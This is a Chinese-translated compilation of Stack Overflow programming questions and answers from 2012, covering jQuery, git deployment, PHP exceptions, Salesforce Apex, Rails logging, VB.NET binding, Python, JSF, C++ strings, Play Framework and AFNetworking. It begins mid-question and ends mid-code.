[http://jsfiddle.net/apHLu/279/](http://jsfiddle.net/apHLu/279/)

```
var $dropDiv = $('#dropDiv');
   $('#holder a').on('click', function() {
    // get position of the element we clicked on
    var offset = $(this).offset();

    // get width/height of click element
    var h = $(this).outerHeight();
    var w = $(this).outerWidth();

    // get width/height of drop element
    var dh = $dropDiv.outerHeight();
    var dw = $dropDiv.outerWidth();

    // determine middle position
    var initLeft = offset.left + ((w/2) - (dw/2));

    // animate drop
    $dropDiv.css({
            left: initLeft,
            top: $(window).scrollTop() - dh,
            opacity: 0,
            display: 'block'
        }).animate({
            left: initLeft,
            top: offset.top - dh,
            opacity: 1
        }, 300, 'easeOutBounce');
}); 
```

我基本上想知道，是否可以将点击触发器切换为加载调用？如果不可能的话，我不想糊里糊涂地试图让它发挥作用。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:47:40.767

这是一个[更新的 Fiddle](http://jsfiddle.net/apHLu/280/)。 `$(function() { ... });`是“文档准备就绪”的缩写。我也将函数包裹在 中`setTimeout();`，因为它的触发速度有点快，可以看到完整的效果。更改第二个参数`setTimeout`以调整它等待触发的时间...

**更新**（根据@coby 的建议）**：**如果您确实有大量图像，您可以更改`$(function() {`为`window.onload(function() {`. Ready 不会等待所有图像完全加载。

# git - 使用 git 进行 Web 测试和部署实时站点

> ID：13271549
> 
> 赞同：1
> 
> 时间：2012-11-07T14:16:39.733
> 
> 标签：git, zend-framework, egit, zend-studio, git-bash

目前我有一个本地 git repo，它位于 H: 驱动器中。当我对文件进行更改并保存它们时，它们会存储在这里。然后，我可以在我的 git 服务器上的远程仓库中提交、推送和拉取文件和分支。

我想做的是处理文件，而不是将它们保存到本地 H 驱动器，我想将它们保存到我的测试服务器上，以便可以在浏览器中从该服务器运行和测试它们。当所有测试完成后，我想将文件从测试服务器合并到实时服务器，并将它们作为实时系统，或者我需要从我的测试服务器和我的实时服务器中提取文件并在本地合并它们并将主分支推回实时服务器？

此外，当分支合并到我的实时主分支并推送到实时服务器时，我将如何从 git repo 中“解包”所有文件，以便它们可以作为实时站点运行。

我已经尝试`git archive`并继续阅读`git bundle`以尝试看看这是否可以让我进行某种“解包”，但到目前为止我还没有能够实现任何我可以真正使用的东西。

这是否有可能按照我所描述的方式工作，如果是这样，你将如何去做？

如果这是不可能的，或者如果有更好的方法可以做到这一点，我忽略了，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T15:12:41.363

我不知道您对拆包的意思是什么，但我想您正在寻找的是部署更改的可能性。假设您正在开发您的应用程序，并且为此使用了 staging 或 dev 分支。现在，如果您想在您的测试服务器上测试您的应用程序，您首先必须将所有内容推送到您的存储库。你可能想看看[Capistrano](https://github.com/capistrano/capistrano/wiki)。使用 Capistrano，无论您使用哪种编程语言，您都可以轻松部署您的应用程序。这样做的过程是首先使用“sudo aptitude install capistrano”甚至更好的“gem install capistrano”安装 Capistrano。现在您已经拥有它，您可以在本地转到您的应用程序并输入“capify”。. 现在 Capistrano 应该创建一些文件，您应该打开 .config/deploy.rb 并为存储库、目标服务器和要推送到目标服务器的分支插入数据。有几个 HowTo，但你对 default.rb 应该很熟悉。现在通过 Capistrano，您的测试服务器链接到存储库的暂存分支，您可以使用“cap staging deploy”通过 ssh 将您的应用程序部署到测试服务器。如果一切正常，您可以在本地将暂存分支合并到主分支并将其推送到您的存储库中。现在，由于您的 Live 系统应该链接到您的 repo 的 master 分支，您可以键入“cap production deploy”让应用程序在您的 live 系统上运行。您可能需要关心数据库迁移，但总的来说就是这样。

快速安装/配置，您将拥有比现在更好的工作流程。

如果您没有 ssh 访问服务器的权限，您可以查看 git-ftp。希望这对您解决问题有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-24T06:04:40.840

如果您的测试服务器在您的 LAN 上，您可以在其上安装 Samba，然后将其 webroot 挂载为您的 H: 驱动器。如果它是远程服务器，则某种 SSHFS 客户端（例如 Expandrive）可能会起作用。

# php - 冒泡 PHP 中的异常？

> ID：13271555
> 
> 赞同：0
> 
> 时间：2012-11-07T14:17:02.510
> 
> 标签：php, custom-exceptions

假设我有这种情况：

```
function1() call to function2(), and function2() call to function3(). 
```

如果 function3() 抛出异常，我可以从 function1() 中捕获异常吗？

在这种情况下，其中一些函数可能在不同的类中？我可以继续从 function1 捕获吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:20:06.930

如果你没有捕捉到异常，那么它会自动通过调用堆栈冒泡。如果你没有在函数 2 或函数 3 中捕获异常，你将能够在函数 1 中捕获它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:20:53.450

这就是例外的全部意义所在。您可以使用 try catch 语句在函数（无论是简单函数还是方法调用）调用堆栈中的任何位置捕获它们，

# php - Salesforce：在 PHP 中创建 OpportunityLineItems 作为 Opportunity 的一部分

> ID：13271557
> 
> 赞同：2
> 
> 时间：2012-11-07T14:17:07.237
> 
> 标签：php, soap, salesforce

我正在尝试使用 PHP Toolkit 20.0 和 Enterprise SOAP API 将“机会”批量上传到 Salesforce。

我发现这样做的方法是创建一个 Opportunity 对象，然后通过 SOAP API 在 Salesforce 中创建它，然后在响应中，我为该`Id`Opportunity 存在的每个 1..n OpportunityLineItems 使用并使用它。

这不是很有效，因为它使用 2 个 SOAP API 调用，并且在批量完成时会使用大量资源并且容易超时。（我不想一次性减少发送的数量，因为 API 调用是有限的）

**因此，有没有办法在单个 API 调用中同时创建 Opportunity 及其 OpportunityLineItems？**

我尝试了以下方法：

```
$opp = new stdClass();
$opp->Name = 'Opp1';
$opp->StageName = 'Closed Won';
$opp->Account = new stdClass();
$opp->Account->Custom_ID__c = '1234';
$opp->Pricebook2Id = '...'; 
$opp->OpportunityLineItems = array();
$opp->OpportunityLineItems[0] = new stdClass();
$opp->OpportunityLineItems[0]->Description = 'Product name';
$opp->OpportunityLineItems[0]->Quantity = 1;
$opp->OpportunityLineItems[0]->UnitPrice = 10.00;
...
$opp->OpportunityLineItems[n] = new stdClass();
$opp->OpportunityLineItems[n]->Description = 'Product name';
$opp->OpportunityLineItems[n]->Quantity = 1;
$opp->OpportunityLineItems[n]->UnitPrice = 10.00; 
```

但它导致：
`INVALID_FIELD: No such column 'OpportunityLineItems' on entity 'Opportunity'. If you are attempting to use a custom field, be sure to append the '__c' after the custom field name. Please reference your WSDL or the describe call for the appropriate names.`
这是意料之中的，因为 WSDL 文件指出 OpportunityLineItems 是类型`tns:QueryResult`而不是`ens:`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T15:50:02.117

**编辑**：完成大修以显示如何同时添加多个 opp。如果您可以以某种方式错开它们的创建（将它们存储在本地数据库中并仅在您有几个/足够的时间过去/用户按下“刷新队列”按钮时才上传）应该很有用。

警告，代码现在看起来更吓人了，你最好先在编辑历史中检查[以前的版本。](/posts/13273213/revisions)

创建一个 Apex 类来接受带有 2 个参数的传入请求并尝试插入它们并不难。转到 Setup->Develop->Classes->New 并尝试以下操作：

```
global with sharing class OpportunityLinkedInsert{

    static webservice Opportunity insertSingle(Opportunity opp, OpportunityLineItem[] lines){
        if(opp == null || lines == null){
            throw new IntegrationException('Invalid data');
        }
        Opportunity[] result = insertMultiple(new List<Opportunity>{opp}, new List<List<OpportunityLineItem>>{lines});
        return result[0]; // I imagine you want the Id back :) 
    }

    /*  I think SOAP doesn't handle method overloading well so this method has different name.
        'lines' are list of lists (jagged array if you like) so opps[i] will be inserted and then lines[i] will be linked to it etc.

        You can insert up to 10,000 rows in one go with this function (remember to count items in both arrays).
    */
    static webservice List<Opportunity> insertMultiple(List<Opportunity> opps, List<List<OpportunityLineItem>> lines){
        if(opps == null || lines == null || opps.size() == 0 || opps.size() != lines.size()){
            throw new IntegrationException('Invalid data');
        }
        insert opps;

        // I need to flatten the structure before I insert it.
        List<OpportunityLineItem> linesToInsert = new List<OpportunityLineItem>();

        for(Integer i = 0; i < opps.size(); ++i){
            List<OpportunityLineItem> linesForOne = lines[i];
            if(linesForOne != null && !linesForOne.isEmpty()){
                for(Integer j = 0; j < linesForOne.size(); ++j){
                    linesForOne[j].OpportunityId = opps[i].Id;
                }
                linesToInsert.addAll(linesForOne);
            }
        }
        insert linesToInsert;
        return opps;
    }

    // helper class to throw custom errors
    public class IntegrationException extends Exception{}
} 
```

您还需要一个单元测试课程，然后才能进入您的生产组织。应该做这样的事情（需要在 100% 可用之前填充更多的东西，[有关更多信息，请参阅此问题](/questions/9164986/how-do-i-avoid-standard-price-not-defined-when-unit-testing-an-opportunitylineit)）。

```
@isTest
public class OpportunityLinkedInsertTest{
    private static List<Opportunity> opps;
    private static List<List<OpportunityLineItem>> items;

    @isTest
    public static void checSingleOppkErrorFlow(){
        try{
            OpportunityLinkedInsert.insertSingle(null, null);
            System.assert(false, 'It should have failed on null values');
        } catch(Exception e){
            System.assertEquals('Invalid data',e.getMessage());
        }
    }

    @isTest
    public static void checkMultiOppErrorFlow(){
        prepareTestData();
        opps.remove(1);

        try{
            OpportunityLinkedInsert.insertMultiple(opps, items);
            System.assert(false, 'It should have failed on list size mismatch');
        } catch(Exception e){
            System.assertEquals('Invalid data',e.getMessage());
        }
    }

    @isTest
    public static void checkSuccessFlow(){
        prepareTestData();
        List<Opportunity> insertResults = OpportunityLinkedInsert.insertMultiple(opps, items);

        List<Opportunity> check = [SELECT Id, Name, 
            (SELECT Id FROM OpportunityLineItems) 
            FROM Opportunity 
            WHERE Id IN :insertResults 
            ORDER BY Name];
        System.assertEquals(items[0].size(), check[0].OpportunityLineItems.size(), 'Opp 1 should have 1 product added to it');
        System.assertEquals(items[1].size(), check[0].OpportunityLineItems.size(), 'Opp 3 should have 1 products');
    }

    // Helper method we can reuse in several tests. Creates 2 Opportunities with different number of line items.
    private static void prepareTestData(){
        opps = new List<Opportunity>{
            new Opportunity(Name = 'Opp 1', StageName = 'Prospecting', CloseDate = System.today() + 10),
            new Opportunity(Name = 'Opp 2', StageName = 'Closed Won', CloseDate = System.today())
        };

        // You might have to fill in more fields here!
        // Products are quite painful to insert with all their standard/custom pricebook dependencies etc...
        items = new List<List<OpportunityLineItem>>{
            new List<OpportunityLineItem>{
                new OpportunityLineItem(Description = 'Opp 1, Product 1', Quantity = 1, UnitPrice = 10)
            },
            new List<OpportunityLineItem>{
                new OpportunityLineItem(Description = 'Opp 2, Product 1', Quantity = 1, UnitPrice = 10),
                new OpportunityLineItem(Description = 'Opp 2, Product 2', Quantity = 1, UnitPrice = 10),
                new OpportunityLineItem(Description = 'Opp 2, Product 3', Quantity = 1, UnitPrice = 10)
            }
        };
    }
} 
```

* * *

这与 Apex 代码差不多。

如果任一插入失败，您将返回 SOAP 异常。[这在事务、 ACID](http://en.wikipedia.org/wiki/ACID)等方面也更好一些- 如果插入您的行项目将失败，您准备好从 PHP 端清理它吗？如果在 Salesforce 中设置了一些自动电子邮件通知等并且已经发送了怎么办？一次调用 Apex 将确保回滚整个请求，就像在数据库中工作的存储过程一样。

尝试在沙盒中创建这些类，然后在类列表中找到第一个。它将有一个生成 WSDL 文件的链接，您可以使用该文件生成 PHP 类。转到第二个，您将看到一个“运行测试”按钮。在将测试推送到您的生产组织之前，您必须确保测试通过 - 但这对您来说[是平台上编程](http://wiki.developerforce.com/page/An_Introduction_to_Apex)的全新世界:)

# ruby-on-rails-3 - ActiveRecord：除了 Rails 日志中的总时间之外，是否可以获取执行的 DB 查询的数量？

> ID：13271561
> 
> 赞同：0
> 
> 时间：2012-11-07T14:17:20.510
> 
> 标签：ruby-on-rails-3, performance, activerecord

对于每个请求，我都会在日志中得到这个：

```
Completed 200 OK in 854ms (Views: 1.0ms | ActiveRecord: 17.0ms) 
```

是否有可能让它也包括查询的数量？
就像是：

```
Completed 200 OK in 854ms (Views: 1.0ms | ActiveRecord: 17.0ms | Queries: 10) 
```

理想情况下，我希望所有“缓存”的也显示在该计数中。即，即使“缓存”使我免于访问数据库的“N+1”查询，我仍然想知道我有问题。

我很喜欢猴子补丁/手动编辑一些东西，因为我真的想要这个只是为了我的开发盒。

（如果这可以文明地制作，以便我可以在生产中使用它，那就更好了，但如果没有，我可以在自己的机器上手动修改 Rails）

谢谢！
丹尼尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T15:28:39.327

我知道[ThinkingSphinx](https://github.com/pat/thinking-sphinx) gem 做了类似的事情，将运行 Sphinx 查询所花费的时间添加到日志中的摘要中。您可能可以做类似的事情（也许通过制作自己的 gem，因为我敢打赌其他人会喜欢这个功能）来显示查询的数量。我并没有真正仔细研究它是如何工作的，但看起来对 ActionController 和 LogSubscriber 的修改是负责任的：

lib/thinking_sphinx/action_controller.rb：

```
module ThinkingSphinx
  module ActionController
    extend ActiveSupport::Concern

    protected

    attr_internal :query_runtime

    def cleanup_view_runtime
      log_subscriber = ThinkingSphinx::ActiveRecord::LogSubscriber
      query_runtime_pre_render = log_subscriber.reset_runtime
      runtime = super
      query_runtime_post_render = log_subscriber.reset_runtime
      self.query_runtime = query_runtime_pre_render + query_runtime_post_render
      runtime - query_runtime_post_render
    end

    def append_info_to_payload(payload)
      super
      payload[:query_runtime] = query_runtime
    end

    module ClassMethods
      def log_process_action(payload)
        messages, query_runtime = super, payload[:query_runtime]
        messages << ("Sphinx: %.1fms" % query_runtime.to_f) if query_runtime
        messages
      end
    end
  end
end 
```

lib/thinking_sphinx/active_record/log_subscriber.rb：

```
require 'active_support/log_subscriber'

module ThinkingSphinx
  module ActiveRecord
    class LogSubscriber < ActiveSupport::LogSubscriber
      def self.runtime=(value)
        Thread.current['thinking_sphinx_query_runtime'] = value
      end

      def self.runtime
        Thread.current['thinking_sphinx_query_runtime'] ||= 0
      end

      def self.reset_runtime
        rt, self.runtime = runtime, 0
        rt
      end

      def initialize
        super
        @odd_or_even = false
      end

      def query(event)
        self.class.runtime += event.duration
        return unless logger.debug?

        identifier = color('Sphinx Query (%.1fms)' % event.duration, GREEN, true)
        query = event.payload[:query]
        query = color query, nil, true if odd?

        debug "  #{identifier}  #{query}"
      end

      def message(event)
        return unless logger.debug?

        identifier = color 'Sphinx', GREEN, true
        message = event.payload[:message]
        message = color message, nil, true if odd?

        debug "  #{identifier}  #{message}"
      end

      def odd?
        @odd_or_even = !@odd_or_even
      end

      def logger
        return @logger if defined? @logger
        self.logger = ::ActiveRecord::Base.logger
      end

      def logger=(logger)
        @logger = logger
      end

      attach_to :thinking_sphinx
    end
  end
end 
```

我希望这有帮助。

# vb.net - BindingCompleteState - 获取导致异常的字段

> ID：13271562
> 
> 赞同：0
> 
> 时间：2012-11-07T14:17:22.217
> 
> 标签：vb.net, data-binding

我正在动态创建一些控件并将它们绑定到数据库：

```
'childElem is an XElement containing data for the control,
'dpBindingSource is the bindingSource Connected with the database
 Select Case cntrl.GetType
    Case GetType(TextBox)
      Dim txt As TextBox
      txt = DirectCast(cntrl, TextBox)
      txt.DataBindings.Add(New Binding("Text", dpBindingSource, childElem.Element("Col_Source").Value, True))
      AddHandler txt.TextChanged, AddressOf controlValueChanged

     Case GetType(ComboBox)
       Dim cbo As ComboBox
       cbo = DirectCast(cntrl, ComboBox)
       With cbo
         .DataSource = dt 'datatable to fill the combo
         .DisplayMember = childElem.Element("Display_Member").Value
         .ValueMember = childElem.Element("Value_Member").Value
         .DataBindings.Add(New Binding("SelectedValue",dpBindingSource, childElem.Element("Col_Source").Value , True))
       End with
       AddHandler cbo.SelectedIndexChanged, AddressOf controlValueChanged

   End Select 
```

因此，当我尝试更新时，我会检查 dpBindingSource_BindingComplete。例如，如果文本框中的格式应该是数字，我会收到一个消息框：

```
 Private Sub dpBindingSource_BindingComplete(sender As Object, e As System.Windows.Forms.BindingCompleteEventArgs) Handles dpBindingSource.BindingComplete

    If Not e.BindingCompleteState = BindingCompleteState.Success Then
        MessageBox.Show(e.ErrorText)
    End If
  End Sub 
```

我想要的是控件名称，如果这是不可能的，那么数据库中导致错误的列名。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T15:59:28.610

我找到了解决方案：

```
MessageBox.Show("Error :" & e.ErrorText + vbCrLf & _
                        "Control : " & e.Binding.Control.Name.ToString + vbCrLf & _
                        "Field : " & e.Binding.BindingMemberInfo.BindingField.ToString + vbCrLf & _
                        "Info :" & e.Binding.BindableComponent.ToString + vbCrLf & _
                        "Correct Format :" & e.Exception.InnerException.TargetSite.DeclaringType.Name) 
```

# python - Python中新手的解码和格式化

> ID：13271565
> 
> 赞同：1
> 
> 时间：2012-11-07T14:17:32.077
> 
> 标签：python

我只是想对一些 Python 脚本进行一些快速调试，但我有点挣扎，因为我是一个语法新手。我通过网络获取了一些数据，如下所示：

```
a = self.block.decode('hex')[95:63:-1]
b = self.midstate.decode('hex')[::-1]
payload = a + b 
print("Data Received {} \n", payload) 
```

我会对两件事感兴趣：

1.  有多少字节/位被保存`payload`？我试过`payload__len()`了，但没有奏效

2.  我想以`payload`32 位十六进制字输出值，有人知道如何用 Python 来完成吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:24:34.113

1：

在 python 中，长度与对象是分开的。因此， `len(payload)`只要有效负载是可以具有长度的对象，就可以为您提供有效负载的长度。

例子：

```
>>> lst = [1,2,3,4]
>>> len(lst)
4 
```

2：

[python 2.5：如何将浮点数转换为十六进制？](https://stackoverflow.com/questions/4432491/python-2-5-how-to-convert-float-to-hex)

给你的例子：

```
>>> hex(800)
'0x320'
>>> hex(123456789)
'0x75bcd15' 
```

# javascript - 如何更改除跨度之外的文本

> ID：13271566
> 
> 赞同：0
> 
> 时间：2012-11-07T14:17:36.370
> 
> 标签：javascript, jquery, jquery-plugins

我们如何更改除跨度文本之外的文本数据？

```
<h2 id="nameUser" >Muhammed <span> mobile :989 531 9991</span></h2> 
```

`h2`除了跨度之外，有什么解决方案可以改变吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:24:00.167

`.contents()`返回节点集合，包括文本节点。因此，在您的情况下，这将起作用：

```
$('#nameUser').contents()​​​​​​​​[0].nodeValue = 'Another name';​​ 
```

如果要获取除 SPAN 之外的所有节点，请尝试：

```
$('#nameUser').contents().filter(function() {
    return this.nodeName != 'SPAN';
}).​each(function(i) {
    // modify each text node
    this.nodeValue = 'name '+i;
});​​​​​ 
```

演示：http: [//jsfiddle.net/Vks82/](http://jsfiddle.net/Vks82/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:21:19.897

在 h2 元素的 childNodes 中搜索第一个文本节点。更改文本节点的值。

```
var element = document.getElementById('nameUser');
element.childNodes[0].nodeValue = 'New String'; 
```

..应该管用。仅针对此示例，因为第一个子节点是您想要的文本节点，所以您不必搜索它。否则你做..

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:19:09.163

```
$('#nameUser').contents().each(function() {
    if (this.nodeType == 3) 
        this.data = "The text you want here";
});​ 
```

[**现场演示**](http://jsfiddle.net/nPh3S/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-07T14:23:39.147

[此](http://jsfiddle.net/4mThh/)示例可以帮助您在不更改子元素的情况下更改父元素：

```
var content= $('#nameUser').children();
$('#nameUser').text('Altered Text').append(content);​ 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-07T14:30:55.753

您可以通过首先保存孩子来做到这一点，这是它工作的代码笔。

[http://codepen.io/beckje01/pen/sGLot](http://codepen.io/beckje01/pen/sGLot)

```
var h2 = $('#nameUser');
var elmsToSave = h2.children();

h2.empty();
h2.text('bob');
h2.append(elmsToSave); 
```

正如评论中所指出的，这仅在首先要更改的文本时才有效。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-07T14:21:01.230

这不仅适用于`span`您想要文本但没有其子文本的任何其他元素。

```
$("#nameUser")
    .clone()   
    .children()
    .remove()  
    .end()  
    .text(); 
```

为了更改文本，我创建了一个简单的 jQuery 函数：

```
replaceTextWith = function($element, $replacement){
    $oldText = $element.clone().children().remove().end().text();
    $element.text($element.text().replace($oldText, $replacement));
}

replaceTextWith($("#nameUser"), "Bruno"); //usage 
```

[这是一个使用小提琴](http://jsfiddle.net/brunovieira/7ar6K/1)的现场示例

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-07T14:29:55.563

试试这个 ...

```
<h2 id="nameUser" >Muhammed <span id="nameUserSpan"> mobile :989 531 9991</span></h2>

<script>
$(document).ready(function() {
    var inspan= $("#nameUserSpan").html();
    var newuser='New User';
    $("#nameUser").html('');
    $("#nameUser").html(newuser + '<span id="nameUserSpan">' + inspan + '</span>');
});
</script> 
```

# jsf - JSF 不读取资源文件夹

> ID：13271567
> 
> 赞同：1
> 
> 时间：2012-11-07T14:17:37.387
> 
> 标签：jsf

我在让 JSF 读取包含我的样式表的资源文件夹时遇到问题。我的 css 库文件夹位于 /webroot/resources/css/style.css

我之前使用过 outputstylesheet 标签没有问题，但我不知道我在这里缺少什么。

```
<html xmlns="http://www.w3.org/1999/xhtml"
  xmlns:h="http://java.sun.com/jsf/html">
<h:head>
    <h:outputStylesheet library="css" name="style.css"/>
    <title>Home</title>  
</h:head> 
```

有任何想法吗？

* * *

**更新**：这是我的一部分`web.xml`：

```
<context-param>
    <param-name>javax.faces.DEVELOPMENT</param-name>
    <param-value>Development</param-value>
</context-param>
<servlet>
    <servlet-name>Faces Servlet</servlet-name>
    <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>Faces Servlet</servlet-name>
    <url-pattern>/faces/*</url-pattern>
</servlet-mapping>
<session-config>
    <session-timeout>
        30
    </session-timeout>
</session-config>
<welcome-file-list>
    <welcome-file>faces/index.xhtml</welcome-file>
</welcome-file-list> 
```

# apache-flex - 如何在晚上 11.30 等特定时间播放 rtmp 网址？

> ID：13271569
> 
> 赞同：0
> 
> 时间：2012-11-07T14:17:37.870
> 
> 标签：apache-flex, netstream

我想在晚上 11.30 等特定时间使用 netstream 播放 url。

`CurrentDateTime = new Date();`

`CurrentDF = new DateFormatter();`

`CurrentDF.formatString = "LL:NN:SS A"`

`DateTime= CurrentDF.format(CurrentDateTime);`

`if(DateTime=="11:30:00 PM"){`

`ns.play("rtmp url");`

`}`

如果在运行我的 flex 应用程序期间恰好时间是“11:30:00 PM”，上面的代码将起作用。但是如果我在此之前运行我的应用程序，我的代码应该等待时间变成 11:30:00 PM播放我的网址..我知道一个解决方案是设置计时器以连续检查...之后我可以在它变成晚上 11:30:00 时停止它...但是我的应用程序是否有任何问题的机会定时器持续触发到晚上 11:30:00？请回复..

# c++ - c++字符串成员函数substr用法

> ID：13271572
> 
> 赞同：3
> 
> 时间：2012-11-07T14:17:51.433
> 
> 标签：c++, string, substring, substr

请告诉我是否正确理解 substr 成员函数？
`result = result.substr(0, pos) + result.substr(pos + 1);`
它从 pos 获取字符串，0 直到（但不包括）， `remove[i]`
然后`+ result.substr(pos + 1);`连接字符串的其余部分，除了但不包括字符串 / char in `remove`?

```
string removeLetters2(string text, string remove)
{
    int pos;
    string result = text;

    for (int i = 0; i < remove.length(); i++)
    {
        while (true)
        {
            pos = result.find(remove[i]);                
            if (pos == string::npos)                      
            {
                break;
            }
            else
            {
                result = result.substr(0, pos) +
                result.substr(pos + 1);
            }
        }
    }
    return result;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T14:21:15.403

简而言之，你问的是

```
result = result.substr(0, pos) +
         result.substr(pos + 1); 
```

删除 position 的字符`pos`，对吗？

## *简短的回答：*

是的。

## *更长的答案：*

两个参数调用采用起始**索引**和**长度**（一个参数调用转到字符串的末尾）。

它有助于想象这样的字符串：

```
F o o / B a r
0 1 2 3 4 5 6   <- indices 
```

现在删除`/`：

```
F o o / B a r
0 1 2 3 4 5 6   <- indices
1 2 3 |         <- 1st length
      | 1 2 3   <- 2nd length

result = result.substr(0, 3)   <- from index 0 with length 3
       + result.substr(4);     <- from index 4 to end 
```

作为程序员，请始终注意距离/索引和长度之间的差异。

## *更好：如果索引已知：*

您的代码创建了两个新的临时字符串，然后将它们连接成第三个临时字符串，然后将其复制到`result`.

最好要求`string`擦除（眨眼眨眼）到位：

```
result.erase(pos,1);
// or by iterator
string::iterator it = ....;
result.erase(it,it+1); 
```

这为实现者留下了更多的优化自由`string`，他们可以选择将 pos 之后的所有字符向左移动一个。在特殊情况下，这可以通过单个赋值、单个循环以及在循环内使用 x86 交换指令来实现。

## *更好：如果要删除的字符已知：*

或者，但我不确定这是否会提供更好的性能，但它*可能会*提供更好的*代码*，算法`remove_if`：

```
#include <algorithm>

// this would remove all slashes, question marks and dots
....
    std::string foobar = "ab/d?...";
    std::remove_if (foobar.begin(), foobar.end(), [](char c) {
        return c=='/' || c=='?' || '.';
    }); 
```

`remove_if`接受任何函数对象。

如果只有一个字符，它会变得更容易：

```
// this would remove all slashes
std::remove (foobar.begin(), foobar.end(), '/'); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T14:23:06.753

尽管您的问题的答案是“是”，但有更好的方法来解决您正在尝试做的事情。使用[`string::erase`](http://www.cplusplus.com/reference/string/string/erase/)，像这样：

```
result.erase(pos, 1); 
```

此 API 旨在从字符串中删除字符；它更有效地实现了相同的结果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T14:24:56.763

`remove`是的，此功能会删除 中的所有字母`text`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T14:29:18.237

由于您似乎删除了不止一种类型的字符，因此也请使用特殊谓词查看`remove_if`from `<algorithm>`，尽管 dasblinkenlignt 的响应是好的

# playframework - Play 中的多步流程

> ID：13271576
> 
> 赞同：2
> 
> 时间：2012-11-07T14:17:59.593
> 
> 标签：playframework, playframework-2.0

我正在尝试在 Play 2.0.3 中实现一些流控制，这是一个包含几个步骤的向导。在 Play 中最好的方法是什么？

我想要多步骤流程，例如**step1 -> step2 -> finish**

主要问题是不允许用户跳过例如 step2 并直接完成（用户可以在浏览器中手动输入链接**/finish**）。

谢谢。如果我没有很好地解释自己，请告诉我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:27:33.950

你至少有两个选择：

*   使用 POST 方法在步骤之间发送数据，这将始终使用相同的 URL，如果用户刷新页面，他将返回到第一步。您的步骤标识符将只是隐藏的表单字段。
*   使用 jQuery 显示后续步骤，您甚至不需要在步骤之间将数据发送到服务器。您可以构建一个大表单（如果它是表单）并使用 jQuery 显示/隐藏其部分。最后，您将执行包含所有步骤的通用表单提交，在那里您可以验证并显示“谢谢”页面。
*   或者，您可以使用 AJAX 和 jQuery 来分离验证和保存步骤。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T20:55:35.143

一种完全无状态的方式可能包括将所有数据存储在步骤的 URL 中，其中步骤`n + 1`包含来自步骤的所有数据`n`：

```
GET   /step1    controllers.Application.step1
GET   /step2    controllers.Application.step2(dataFromStep1)
GET   /step3    controllers.Application.step3(dataFromStep1, dataFromStep2)
POST  /finish   controllers.Application.finish 
```

该解决方案的优势在于其简单性以及 Play! 免费执行下一步之前检查所有必需步骤是否已完成的事实！路由器。

但是，如果您有大量数据，您的 URL 将非常庞大，从而使该解决方案不太适用。在这种情况下，您需要：

*   将每个步骤的数据保存到持久存储（使用会话是另一种选择，但大小限制为 4KB）；
*   识别您的用户，例如`/step2`URL 不会为不同的用户返回相同的内容；
*   设置超时以丢弃不完整的提交并清理您的持久存储；
*   手动检查您的业务代码是否已完成最终提交的所有步骤。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T20:56:48.280

我会将这些步骤存储在数据库中（长期）或缓存中（短期）。这样，您可以构建一些逻辑`if (secondQuestionAnswered) { .. }`并确保您的用户没有跳过任何内容和/或用户可以在他想要的时候完成这些步骤。如果您的应用程序增长并且您需要对其进行扩展，那么持久保存在数据库或缓存中也会受益。

# iphone - AFHTTPRequestOperation 批量下载多个文件

> ID：13271578
> 
> 赞同：0
> 
> 时间：2012-11-07T14:18:03.203
> 
> 标签：iphone, afnetworking

正如 ASIHTTP 已被弃用一样，对于我正在从事的一个新项目，我正在尝试学习 AFNetworking，但我面临一些我无法解决的问题。我需要从我的网站下载许多图像以将其保存在本地。不幸的是，这些图像不是服务器独立的服务器，而是合并到一个 plist 中，图像数据返回给我一些参数

提供图像的 php 代码是这样的

```
$plist = new CFPropertyList();
$plist->add($maindict = new CFdictionary());
$maindict->add('foldername',new CFString($fol_name));
$file_ext = ($fol_name == "iPhoneRetina") ? "@2x.png" : ".png";
$file_path = "1";
$imgfile = __DIR__.'/documents/'.$file_path.'/'.$fol_name.'/doc_'.$file_path.'_pagina_'.$page_nr.$file_ext;
$imgbinary = fread(fopen($imgfile, "r"), filesize($imgfile));
$maindict->add('image',new CFData($imgbinary));
$maindict->add('page_nr',new CFNumber($page_nr));
$maindict->add('document_id',new CFNumber($doc_id)); 
```

管理对服务器此页面的请求，我使用了此代码

```
AFHTTPClient *client = [[AFHTTPClient alloc] initWithBaseURL:downloadURL];
    NSDictionary *params;
    AFHTTPRequestOperation *operation;
    for (int x = 0; x < 10; x++) {
        params = @{
            @"page_nr" : [NSNumber numberWithInt:x],
            @"doc_id" : @1,
        };
        NSMutableURLRequest *request = [client requestWithMethod:@"POST" path:@"/getMagazinePage.php" parameters:params];
        operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];
        [tempOperations addObject:operation];
    }
    [client enqueueBatchOfHTTPRequestOperations:tempOperations
                                  progressBlock:^(NSUInteger numberOfCompletedOperations, NSUInteger totalNumberOfOperations) {
                                      dispatch_async(dispatch_get_main_queue(), ^{
